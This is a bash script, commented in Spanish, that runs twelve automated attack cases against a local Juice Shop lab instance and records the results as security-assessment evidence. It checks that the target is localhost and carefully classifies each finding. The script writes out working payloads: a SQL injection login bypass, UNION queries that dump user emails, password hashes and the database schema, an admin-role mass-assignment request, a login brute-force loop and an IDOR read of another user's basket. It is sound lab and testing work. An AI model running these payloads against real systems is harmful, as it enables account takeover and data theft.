#!/usr/bin/env bash
# Casos de ataque automatizados de la Fase 4 (caja gris: con conocimiento del código).
# ALCANCE: SOLO la instancia propia del laboratorio en 127.0.0.1. Rechaza cualquier otro objetivo.
# Mide el RIESGO INHERENTE. En la Fase 6 el mismo script se ejecuta contra el entorno endurecido
# (variable TARGET) para medir el riesgo residual.
# Uso: security/attacks/run.sh [http://127.0.0.1:3000]
set -uo pipefail
TARGET="${1:-http://127.0.0.1:3000}"
host="$(printf '%s' "$TARGET" | sed -E 's#https?://##; s#[:/].*##')"
case "$host" in
  127.0.0.1|localhost|::1|juice-hardened|juice-lab) : ;;
  *) echo "RECHAZADO: objetivo '$host' fuera del laboratorio. Solo 127.0.0.1/localhost."; exit 2 ;;
esac

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
TAG="${ATTACK_TAG:-antes}"            # 'antes' (vulnerable) o 'despues' (endurecido)
OUT="$ROOT/evidence/fase-4/$TAG"
mkdir -p "$OUT"
SUM="$OUT/resumen-ataques.md"
: > "$SUM"
C="curl -s -k --max-time 20"
pass=0; fail=0; n=0

# registra(id, titulo, cwe, clase, veredicto, detalle)
#   clase: E=explotación demostrada | X=exposición observada | C=configuración insegura | N=ausencia de control
#   veredicto: VULNERABLE | MITIGADO | N/D
#   IMPORTANTE: "VULNERABLE" significa que la CONDICIÓN se detectó; NO implica explotación por sí mismo.
#   La columna Clase indica el tipo real del hallazgo para no exagerar las conclusiones (plan P4).
reg() {
  n=$((n+1))
  [ "$5" = "VULNERABLE" ] && fail=$((fail+1)) || { [ "$5" = "MITIGADO" ] && pass=$((pass+1)); }
  printf '| %s | %s | %s | %s | **%s** | %s |\n' "$1" "$2" "$4" "$3" "$5" "$6" >> "$SUM"
  printf '[%s/%s] %-34s %s\n' "$5" "$4" "$1 $2" "$6"
}
save() { cat > "$OUT/$1"; }

echo "# Casos de ataque Fase 4 — objetivo $TARGET ($TAG)" >> "$SUM"
echo "" >> "$SUM"
echo "Ejecutado: $(date -Iseconds)" >> "$SUM"
echo "" >> "$SUM"
echo "> **Clase:** E=explotación demostrada · X=exposición observada · C=configuración insegura · N=ausencia de control." >> "$SUM"
echo "> **Veredicto** VULNERABLE = la condición se detectó (no implica explotación); la clase indica el tipo real del hallazgo." >> "$SUM"
echo "" >> "$SUM"
echo "| ID | Caso | Clase | CWE | Veredicto | Detalle |" >> "$SUM"
echo "|---|---|---|---|---|---|" >> "$SUM"

### A1 — SQLi: bypass de login como admin (CWE-89, routes/login.ts:34)
r=$($C -X POST "$TARGET/rest/user/login" -H 'Content-Type: application/json' \
  --data '{"email":"'"'"' OR 1=1--","password":"x"}')
echo "$r" | save a1-sqli-login.json
if echo "$r" | grep -q '"token"'; then
  email=$(echo "$r" | grep -oE '"email":"[^"]*"' | head -1)
  reg A1 "SQLi bypass de login" CWE-89 E VULNERABLE "Autenticado sin credenciales; $email"
else reg A1 "SQLi bypass de login" CWE-89 E MITIGADO "Sin token (HTTP $(echo "$r" | head -c 40))"; fi

### A2 — SQLi UNION en búsqueda: extraer email+hash de usuarios (CWE-89, routes/search.ts:23)
q="qwert'))%20UNION%20SELECT%20id,email,password,'4','5','6','7','8','9','10'%20FROM%20Users--"
r=$($C "$TARGET/rest/products/search?q=$q")
echo "$r" | save a2-sqli-union-search.json
if echo "$r" | grep -qiE '([a-f0-9]{32})'; then
  reg A2 "SQLi UNION (volcado de Users)" CWE-89 E VULNERABLE "Se obtienen email y hash MD5 de usuarios"
else reg A2 "SQLi UNION (volcado de Users)" CWE-89 E MITIGADO "Sin datos de Users en la respuesta"; fi

### A3 — Enumeración del esquema vía SQLi (sqlite_master) (CWE-89)
q="qwert'))%20UNION%20SELECT%20sql,'2','3','4','5','6','7','8','9','10'%20FROM%20sqlite_master--"
r=$($C "$TARGET/rest/products/search?q=$q")
echo "$r" | save a3-sqli-schema.json
if echo "$r" | grep -qi "CREATE TABLE"; then
  reg A3 "SQLi enumeración de esquema" CWE-89 E VULNERABLE "sqlite_master revela DDL de las tablas"
else reg A3 "SQLi enumeración de esquema" CWE-89 E MITIGADO "Sin DDL en la respuesta"; fi

### A4 — Listado de directorios sensibles (CWE-548, server.ts:290/298/302)
vd=""
for p in ftp encryptionkeys support/logs; do
  code=$($C -o /dev/null -w '%{http_code}' "$TARGET/$p/")
  body=$($C "$TARGET/$p/")
  echo "GET /$p/ -> $code"; echo "$body" | head -c 4000
  echo "---"
  if [ "$code" = "200" ] && echo "$body" | grep -qiE 'href=|<a '; then vd="$vd /$p"; fi
done > "$OUT/a4-directory-listing.txt" 2>&1
if [ -n "$vd" ]; then reg A4 "Listado de directorios" CWE-548 X VULNERABLE "Navegables:$vd"
else reg A4 "Listado de directorios" CWE-548 X MITIGADO "Sin listados navegables"; fi

### A5 — Exposición de documento interno listado en /ftp (CWE-538, no path traversal)
# Acceso DIRECTO a un archivo ya expuesto por el listado (A4). No se usa '../': por tanto es
# exposición de archivo sensible (CWE-538), no CWE-22. Etiqueta corregida (plan F45-03).
r=$($C -o "$OUT/a5-acquisitions.md" -w '%{http_code}' "$TARGET/ftp/acquisitions.md")
if [ "$r" = "200" ] && [ -s "$OUT/a5-acquisitions.md" ]; then
  reg A5 "Exposición de documento interno (/ftp)" CWE-538 X VULNERABLE "acquisitions.md descargado por acceso directo (HTTP 200); no es traversal"
else reg A5 "Exposición de documento interno (/ftp)" CWE-538 X MITIGADO "HTTP $r"; fi

### A6 — /metrics expuesto sin autenticación (CWE-200, server.ts:759)
code=$($C -o "$OUT/a6-metrics.txt" -w '%{http_code}' "$TARGET/metrics")
if [ "$code" = "200" ] && grep -qiE '^# (HELP|TYPE)' "$OUT/a6-metrics.txt"; then
  reg A6 "/metrics sin autenticación" CWE-200 X VULNERABLE "Métricas Prometheus accesibles (HTTP 200)"
else reg A6 "/metrics sin autenticación" CWE-200 X MITIGADO "HTTP $code"; fi

### A7 — Asignación masiva: registrar usuario con role=admin (CWE-915, server.ts:436)
em="attacker_$(date +%s)@juice-sh.op"
r=$($C -X POST "$TARGET/api/Users" -H 'Content-Type: application/json' \
  --data '{"email":"'"$em"'","password":"Passw0rd!","role":"admin"}')
echo "$r" | save a7-mass-assignment.json
if echo "$r" | grep -q '"role":"admin"'; then
  reg A7 "Asignación masiva (role=admin)" CWE-915 E VULNERABLE "Usuario creado con role=admin"
else reg A7 "Asignación masiva (role=admin)" CWE-915 E MITIGADO "role no aceptado ($(echo "$r" | grep -oE '"role":"[^"]*"' | head -1))"; fi

### A8 — CORS permisivo (CWE-942, server.ts:184)
hdr=$($C -D - -o /dev/null -H 'Origin: https://evil.example' "$TARGET/rest/admin/application-version")
echo "$hdr" | save a8-cors-headers.txt
# NOTA (plan F45-05): ACAO:* es una CONFIGURACIÓN insegura; por sí sola NO prueba lectura de datos
# autenticados de otro origen (con ACAO:* el navegador no envía credenciales). Clase = C (configuración).
if echo "$hdr" | grep -qiE 'access-control-allow-origin: (\*|https://evil.example)'; then
  reg A8 "CORS permisivo (configuración)" CWE-942 C VULNERABLE "ACAO:* permisivo (config insegura); no demuestra robo de datos autenticados"
else reg A8 "CORS permisivo (configuración)" CWE-942 C MITIGADO "Sin ACAO abierto"; fi

### A9 — Cabeceras de seguridad ausentes (CWE-693)
hdr=$($C -D - -o /dev/null "$TARGET/")
echo "$hdr" | save a9-security-headers.txt
miss=""
for h in "content-security-policy" "strict-transport-security" "x-content-type-options" "x-frame-options"; do
  echo "$hdr" | grep -qi "^$h:" || miss="$miss $h"
done
if [ -n "$miss" ]; then reg A9 "Cabeceras de seguridad" CWE-693 C VULNERABLE "Ausentes:$miss"
else reg A9 "Cabeceras de seguridad" CWE-693 C MITIGADO "Presentes las 4 cabeceras clave"; fi

### A10 — Fuerza bruta: sin rate limit en /rest/user/login (CWE-307, server.ts:624)
codes=""
for i in $(seq 1 12); do
  c=$($C -o /dev/null -w '%{http_code}' -X POST "$TARGET/rest/user/login" \
    -H 'Content-Type: application/json' --data '{"email":"admin@juice-sh.op","password":"wrong'"$i"'"}')
  codes="$codes $c"
done
echo "12 intentos ->$codes" | save a10-bruteforce-login.txt
if echo "$codes" | grep -q 429; then reg A10 "Fuerza bruta en login" CWE-307 N MITIGADO "Aparece HTTP 429:$codes"
else reg A10 "Fuerza bruta en login" CWE-307 N VULNERABLE "12 intentos sin 429:$codes"; fi

### A11 — Clave PÚBLICA JWT servida en /encryptionkeys (CWE-200; etiqueta corregida, plan F45-02)
# jwt.pub es la clave PÚBLICA (servirla es aceptable por diseño). El riesgo real es la clave PRIVADA
# embebida en el código (lib/insecurity.ts), hallazgo de caja blanca/SAST, NO este endpoint → no es CWE-798.
code=$($C -o "$OUT/a11-jwt-key.txt" -w '%{http_code}' "$TARGET/encryptionkeys/jwt.pub")
if [ "$code" = "200" ] && grep -qi "PUBLIC KEY" "$OUT/a11-jwt-key.txt"; then
  reg A11 "Clave pública JWT servida" CWE-200 X VULNERABLE "jwt.pub (clave PÚBLICA) servida HTTP 200; riesgo real = clave privada embebida en código (SAST)"
else reg A11 "Clave pública JWT servida" CWE-200 X MITIGADO "HTTP $code"; fi

### A12 — BOLA / IDOR entre dos usuarios del laboratorio (CWE-639, OWASP API1/A01)
# Prueba de AUTORIZACIÓN a nivel de objeto. Fin exclusivamente defensivo y académico: comprobar si un
# usuario autenticado puede leer el recurso (cesta) de OTRO usuario. Se crean dos cuentas propias con datos
# ficticios en la instancia aislada. No confundir con asignación masiva (A7). Registra caso positivo y
# control negativo. Evidencia dedicada en evidence/fase-4/bola/ (no altera la línea base histórica A1-A11).
BO="$ROOT/evidence/fase-4/bola"; mkdir -p "$BO"
RB="$BO/resultado-bola.md"
TS=$(date +%s)
ua="bola_a_${TS}@juice-sh.op"; ub="bola_b_${TS}@juice-sh.op"; pw="Passw0rd!123"
mkacct() { $C -X POST "$TARGET/api/Users" -H 'Content-Type: application/json' \
  --data '{"email":"'"$1"'","password":"'"$pw"'","passwordRepeat":"'"$pw"'","securityQuestion":{"id":1},"securityAnswer":"x"}' >/dev/null; }
login() { $C -X POST "$TARGET/rest/user/login" -H 'Content-Type: application/json' \
  --data '{"email":"'"$1"'","password":"'"$pw"'"}'; }
mkacct "$ua"; mkacct "$ub"
la=$(login "$ua"); lb=$(login "$ub")
ta=$(printf '%s' "$la" | grep -oE '"token":"[^"]*"' | head -1 | sed -E 's/"token":"//; s/"//')
tb=$(printf '%s' "$lb" | grep -oE '"token":"[^"]*"' | head -1 | sed -E 's/"token":"//; s/"//')
bida=$(printf '%s' "$la" | grep -oE '"bid":[0-9]+' | head -1 | sed -E 's/"bid"://')
bidb=$(printf '%s' "$lb" | grep -oE '"bid":[0-9]+' | head -1 | sed -E 's/"bid"://')
# Usuario A pone un artículo ficticio en SU cesta (para que el recurso tenga contenido identificable)
$C -X POST "$TARGET/api/BasketItems" -H "Authorization: Bearer $ta" -H 'Content-Type: application/json' \
  --data '{"BasketId":'"${bida:-0}"',"ProductId":1,"quantity":7}' >/dev/null
# Caso POSITIVO: usuario B (su token) intenta LEER la cesta de A (recurso de otro propietario)
cross=$($C -o "$BO/cross-read.json" -w '%{http_code}' -H "Authorization: Bearer $tb" "$TARGET/rest/basket/${bida:-0}")
# Control NEGATIVO/sanity: usuario B lee su PROPIA cesta
own=$($C -o "$BO/own-read.json" -w '%{http_code}' -H "Authorization: Bearer $tb" "$TARGET/rest/basket/${bidb:-0}")
# ¿La respuesta cruzada devolvió la cesta de A (ids distintos y HTTP 200 con contenido)?
if [ "$cross" = "200" ] && [ -n "${bida:-}" ] && [ -n "${bidb:-}" ] && [ "$bida" != "$bidb" ] \
   && grep -qiE '"(ProductId|BasketItem|quantity|id)"' "$BO/cross-read.json"; then
  bverdict="VULNERABLE"; bclase="E"; bdet="Usuario B (bid=$bidb) leyó la cesta de A (bid=$bida) con su propio token; HTTP 200. BOLA confirmado."
else
  bverdict="MITIGADO/NEGATIVO"; bclase="N"; bdet="B no obtuvo la cesta de A (cross HTTP $cross). Recurso protegido o no explotable en esta ruta."
fi
{
  echo "# A12 — BOLA/IDOR entre dos cuentas (riesgo inherente)"
  echo ""
  echo "Ejecutado: $(date -Iseconds) · Objetivo: $TARGET (instancia propia, aislada)"
  echo ""
  echo "| Campo | Valor |"
  echo "|---|---|"
  echo "| Cuenta A (víctima) | $ua (basket id $bida) |"
  echo "| Cuenta B (atacante) | $ub (basket id $bidb) |"
  echo "| Petición cruzada | GET /rest/basket/$bida con token de B |"
  echo "| HTTP cruzado | $cross |"
  echo "| HTTP propio (control) | $own |"
  echo "| Clase / CWE / OWASP | $bclase / CWE-639 / A01 (API1:2023 BOLA) |"
  echo "| Veredicto | **$bverdict** |"
  echo "| Detalle | $bdet |"
  echo ""
  echo "Esperado (si fuera seguro): B debe recibir 401/403 o solo su propia cesta."
  echo "Observado: ver cross-read.json y own-read.json (respuestas saneadas; datos ficticios de laboratorio)."
  echo ""
  echo "> Limitación: prueba de lectura de cesta por id. No generaliza a todos los objetos de la app."
} > "$RB"
printf '[%s/%s] %-34s %s\n' "$bverdict" "$bclase" "A12 BOLA/IDOR" "$bdet"
echo "   -> $RB"

echo "" >> "$SUM"
echo "**Resultado:** $fail VULNERABLE / $pass MITIGADO de $n casos (A1-A11). A12 BOLA/IDOR: ver evidence/fase-4/bola/." >> "$SUM"
echo ""
echo "=== $fail VULNERABLE / $pass MITIGADO de $n casos ($TAG) ==="
bash "$ROOT/scripts/bitacora.sh" 4 "security/attacks/run.sh ($TARGET, $TAG)" "curl + código del laboratorio" "$fail VULNERABLE / $pass MITIGADO de $n. $SUM"
